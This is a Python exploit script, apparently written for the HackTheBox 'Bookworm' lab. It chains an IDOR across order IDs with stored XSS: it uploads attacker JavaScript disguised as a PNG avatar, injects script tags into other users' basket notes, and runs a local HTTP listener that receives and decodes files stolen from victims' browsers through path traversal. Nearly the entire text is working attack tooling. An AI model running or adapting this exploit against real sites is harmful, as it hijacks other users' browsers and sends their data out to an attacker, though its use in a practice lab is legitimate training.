#!/usr/bin/env python3
from argparse import ArgumentParser
from requests import Session, exceptions
from uuid import uuid4
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup
from base64 import b64decode
from zipfile import ZipFile
from json import loads, JSONDecodeError
import logging

logger = logging.getLogger("pypdf")
logger.setLevel(logging.ERROR)

class ReceiverBaseServer(BaseHTTPRequestHandler):

    def log_message(self, *args):
        return

    def do_POST(self):
        self.send_response(200)
        self.server.hasReceivedCallback = True

        bodySize = int(self.headers.get('Content-Length'))
        bodyBytes = self.rfile.read(bodySize)
        body = bodyBytes.decode("utf-8")

        try:
            self.printReceivedFile(body)
        except JSONDecodeError:
            print(body)

    def printReceivedFile(self, jsonStr: str):
        json = loads(jsonStr)
        uri = json.get("uri")
        blob = json.get("blob")

        fileName = uri.split("..")[-1]
        fileContent = self.getBlobZipContent(blob)

        print("##############")
        print(fileName)
        print("--------------")
        print(fileContent)
        print("##############")

    def getBlobZipContent(self, blob: str) -> str:
        base64File = blob.split(',')[1]
        zipBytes = b64decode(base64File.encode())
        zipPath = "/tmp/received.zip"

        with open(zipPath, "wb") as out:
            out.write(zipBytes)

        with ZipFile(zipPath, mode="r") as archive:
            if "Unknown.pdf" in archive.namelist():
                content = archive.read("Unknown.pdf").decode("utf-8")
                return content

class ReceiverServer(HTTPServer):

    def __init__(self, lhost: str, lport: int, loggedInSession: Session, targetUrl: str):
        HTTPServer.__init__(self, (lhost, lport), ReceiverBaseServer)
        self.session = session=loggedInSession
        self.url = targetUrl
        self.serverThread = None
        self.hasReceivedCallback = False

    def uploadFile(self, content: str) -> str: # Return the file uri
        url = f"{self.url}/profile/avatar"
        file = {"avatar": ("foo.png", content, "image/png")}
        response = self.session.post(url, files=file, timeout=1)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.img["src"]

    def injectXssInOrder(self, orderId: int, payload: str):
        vulnerableUrl = f"{self.url}/basket/{orderId}/edit"
        body = {"quantity": 1, "note": payload}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        self.session.post(vulnerableUrl, headers=headers, data=body, allow_redirects=False)

    def sendXssInOrders(self, ordersIdRange: int, jsUri: str):
        ordersIds = range(ordersIdRange + 1)
        for orderId in ordersIds:
            if self.hasReceivedCallback:
                break

            print(f"Sending payloads.. ({orderId}/{ordersIdRange})", flush=True, end='\r')
            payload = f"<script src='{jsUri}'></script>"
            self.injectXssInOrder(orderId, payload)

    def waitForSomeone(self):
        print("Waiting for someone to add an item to their basket...")
        while not self.hasReceivedCallback:
            shopPage = self.session.get(f"{self.url}/shop").text
            foundSomeone = "to their basket!" in shopPage
            if foundSomeone:
                print("A user added an item to their basket!")
                break
            sleep(1)


    def start(self):
        self.serverThread = Thread(target=self.serve_forever, daemon=True)
        self.serverThread.start()

    def stop(self):
        self.shutdown()
        self.serverThread.join() 

def getArguments():
    parser = ArgumentParser(description="Reflected XSS & IDOR exploit for HackTheBox Bookworm")
    parser.add_argument("-u", "--url", required=True, help="The target url")
    parser.add_argument("-l", "--lhost", required=False, default="", help="The listening host (Default: 0.0.0.0)")
    parser.add_argument("-p", "--lport", required=False, type=int, default=1234, help="The listening port (Default: 1234)")
    parser.add_argument("-r", "--range", required=False, type=int, default=2000, help="The orderID scanning range (Default: 2000)")
    parser.add_argument("-f", "--file", required=True, help="The javascript file path that will be executed by clients")
    parser.add_argument("-s", "--skip-waiting", action="store_true", help="Don't wait for someone to add an item to their basket to start the exploit")
    return parser.parse_args()

def getLoggedInSession(url: str) -> Session:
    postHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
    randomString = uuid4().hex[:10]
    user = {"name": randomString, "username": randomString, "password": randomString, "addressLine1": "foo", "addressLine2": "foo", "town": "foo", "postcode": "foo"}

    session = Session()
    try:
        session.post(f"{url}/register", headers=postHeaders, data=user, timeout=1)
        session.post(f"{url}/login", headers=postHeaders, data=user, timeout=1)
        return session
    except exceptions.ReadTimeout:
        print("[ERROR] Account creation/login timed-out")
    except (exceptions.ConnectTimeout, exceptions.ConnectionError):
        print("[ERROR] Could not connect to the given url")
    exit(1)

def main():
    args = getArguments()
    url = args.url[:-1] if args.url.endswith('/') else args.url
    session = getLoggedInSession(url)

    receiver = ReceiverServer(args.lhost, args.lport, session, url)
    receiver.start()

    try:
        while True:
            if not args.skip_waiting:
                receiver.waitForSomeone()

            with open(args.file, "r") as jsFile:
                jsFilepath = receiver.uploadFile(jsFile.read())

            receiver.sendXssInOrders(args.range, jsFilepath)
            input("\nPayloads sent. Waiting for the user to complete checkout.\nPress enter to retry. Press Ctrl+C to quit.\n")
            receiver.hasReceivedCallback = False
        
    except KeyboardInterrupt:
        print("\nStopping..")
    receiver.stop()

if __name__ == "__main__":
    main()

